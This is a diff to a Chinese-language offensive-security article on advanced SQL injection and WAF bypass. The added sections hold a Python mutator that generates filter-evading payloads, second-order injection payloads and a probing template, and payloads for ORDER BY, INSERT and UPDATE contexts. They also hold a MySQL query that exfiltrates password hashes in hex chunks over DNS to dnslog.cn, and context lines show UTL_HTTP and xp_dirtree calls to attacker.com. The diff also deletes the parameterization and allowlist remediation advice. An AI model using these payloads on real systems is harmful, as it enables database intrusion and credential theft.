@@ -42,7 +42,7 @@ tags:
   - "second-order"
   - "advanced"
 language: "zh-CN"
-last_updated: "2026-06-25"
+last_updated: "2026-07-04"
 related_articles: []
 ---
 # Advanced SQLi & WAF Bypass — 高级注入与绕过技术
@@ -128,6 +128,45 @@ SELECT CHAR(115,101,108,101,99,116) → 'select'
 /*!50726SELECT*/     -- MySQL >= 5.7.26
 ```
 
+### 1.6 绕过分层打法
+
+WAF 绕过要拆层：HTTP parser、框架参数合并、字符集解码、SQL parser、DBMS 方言。每次只改一层，才知道是哪一层被穿透。
+
+| 层 | 变形 | 示例 | 命中信号 |
+|---|---|---|---|
+| HTTP 参数 | HPP / HPF | `?id=1&id=2 union select` | 后端取最后一个/拼接参数 |
+| Body parser | JSON/multipart/urlencoded 切换 | `{"id":"1 union select"}` | WAF 只看表单 |
+| Transfer | chunked / gzip | `Transfer-Encoding: chunked` | 前置设备未重组 |
+| Charset | GBK/Shift-JIS 宽字节 | `%bf%27` | 引号从转义中逃出 |
+| Token | 大小写/注释/换行 | `UN/**/ION%0ASEL/**/ECT` | SQL parser 正常执行 |
+| Function | 等价函数 | `database()` → `schema()` | 关键词规则失效 |
+| AST | 子查询/派生表 | `SELECT * FROM(SELECT ...)x` | 黑名单匹配不到关键结构 |
+
+小型变形器：
+
+```python
+def mutate_sql_keyword(payload: str):
+    rules = [
+        lambda s: s.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),
+        lambda s: s.replace("SELECT", "SEL/**/ECT").replace("UNION", "UNI/**/ON"),
+        lambda s: s.replace(" ", "/**/"),
+        lambda s: s.replace(" ", "%0a"),
+        lambda s: s.replace("AND", "&&").replace("OR", "||"),
+        lambda s: s.replace("database()", "schema()"),
+    ]
+    seen = {payload}
+    for rule in rules:
+        v = rule(payload)
+        if v not in seen:
+            seen.add(v)
+            yield v
+
+for p in mutate_sql_keyword("1 UNION SELECT 1,database(),3"):
+    print(p)
+```
+
+记录绕过矩阵时保留“被拦截 payload”和“通过 payload”的最小差异，例如只把空格换成 `/**/` 就通过，就不要再叠十种编码。
+
 ## 2. 二阶 SQL 注入
 
 ### 2.1 原理
@@ -151,6 +190,28 @@ INSERT INTO orders (input) VALUES ('1' UNION SELECT 1,2,3--')
 
 -- 读取时触发
 SELECT * FROM orders WHERE input = '1' UNION SELECT 1,2,3--'
+```
+
+### 2.3 二阶注入状态机
+
+二阶注入的核心是“写入点无事发生，读取点重新拼 SQL”。每条候选都要记录写入位置、落库后的形态、触发位置。
+
+| 写入点 | 触发点 | 常见 SQL | Payload 思路 |
+|---|---|---|---|
+| 注册 username | 修改密码/查看资料 | `WHERE username='$u'` | `admin'-- ` |
+| 收货地址 | 订单搜索/导出 | `LIKE '%$addr%'` | `%\' OR 1=1-- ` |
+| 文件名 | 下载记录/图片列表 | `WHERE filename='$name'` | `x' UNION SELECT...` |
+| 昵称 | 管理后台用户列表 | `ORDER BY display_name` | `x',(SELECT...)-- ` |
+| JSON 配置 | 后台统计 | `JSON_EXTRACT(cfg,'$.key')` | JSON path 闭合 |
+
+打点模板：
+
+```text
+1. 写入 marker: revlab_<rand>
+2. 查看详情页/后台列表确认 marker 原样出现
+3. 写入闭合 payload: revlab' AND '1'='2
+4. 在触发点比较 marker 是否消失、报错是否变化、排序/数量是否变化
+5. 再换成布尔/时间/OOB payload 抽取
 ```
 
 ## 3. OOB 带外注入 (Out-of-Band)
@@ -179,6 +240,29 @@ SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHER
 ```sql
 EXEC xp_dirtree '\\attacker.com\share',1,1
 ```
+
+### 3.4 OOB 分段外带
+
+DNS label 最长 63 字节，整域名最长 253 字节；数据要 hex/base32 后分段。每次请求带上 `case_id`、`row`、`pos`，否则日志里很快乱掉。
+
+```sql
+-- MySQL: 每 24 字符一段 hex 后带出
+SELECT LOAD_FILE(CONCAT('\\\\',
+  HEX(SUBSTR((SELECT password FROM users LIMIT 0,1),1,24)),
+  '.r1.p1.case.dnslog.cn\\a'));
+```
+
+日志还原顺序：
+
+```python
+def decode_dns_chunks(labels):
+    data = "".join(labels)
+    return bytes.fromhex(data).decode(errors="replace")
+
+print(decode_dns_chunks(["666c61677b", "64656d6f7d"]))
+```
+
+失败样本：没有 DNS 请求但 HTTP 延迟明显，说明 DBMS 执行到表达式但系统调用被禁；有 DNS 请求但 label 被截断，说明需要缩短 chunk。
 
 ## 4. INSERT 注入
 
@@ -235,6 +319,20 @@ UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
 ?id=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,database())),1)--
 ```
 
+## 9. 非 SELECT 场景 Payload 模型
+
+| 场景 | 可用语义 | 示例 |
+|---|---|---|
+| `ORDER BY` | CASE/子查询/函数调用 | `CASE WHEN((SELECT COUNT(*) FROM users)>0) THEN id ELSE name END` |
+| `GROUP BY` | 报错/重复键/聚合差异 | `floor(rand(0)*2)` |
+| `LIMIT` | 数值表达式/UNION 方言差异 | `1 OFFSET 0` / `1 UNION SELECT ...` |
+| `INSERT value` | 字符串闭合/子查询 | `x',(SELECT database()),'z` |
+| `UPDATE SET` | 子查询赋值/WHERE 扩展 | `x',role='admin` |
+| `DELETE WHERE` | 布尔条件 | `1 OR EXISTS(SELECT 1 FROM users)` |
+| JSON path | path 闭合/函数错误 | `$."x")) OR 1=1-- ` |
+
+`ORDER BY` 没有回显时可以用排序差异做布尔通道：True 时按 `id` 升序，False 时按 `name` 或常量排序；页面第一条记录变化就是 bit。
+
 ## 攻击链 / 工作流
 
 ```
@@ -244,7 +342,7 @@ UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
 4. 将 INSERT/UPDATE/ORDER BY/LIMIT 等非 SELECT 场景分别建模，避免套用单一 payload
 5. 对每种绕过只保留最小可验证 payload，并记录触发条件
 6. 如果 payload 需要外带通道，保存 DNS/HTTP listener 原始日志作为证据
-7. 输出 WAF 规则假设、可绕过语法族和服务端约束建议（参数化 + allowlist）
+7. 输出 WAF 规则假设、可绕过语法族、最小通过 payload 和失败样本
 ```
 
 ## Evidence
@@ -255,7 +353,6 @@ UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
 | 二阶注入 | 写入点请求、触发点请求、延迟或报错输出 |
 | OOB 注入 | DNS/HTTP/SMB listener 日志、唯一 token |
 | 非 SELECT 注入 | INSERT/UPDATE/ORDER BY/LIMIT 的最小触发语句 |
-| 约束效果 | 参数化后同 payload 不再改变 SQL 语义 |
 
 ## MCP 工具映射
 
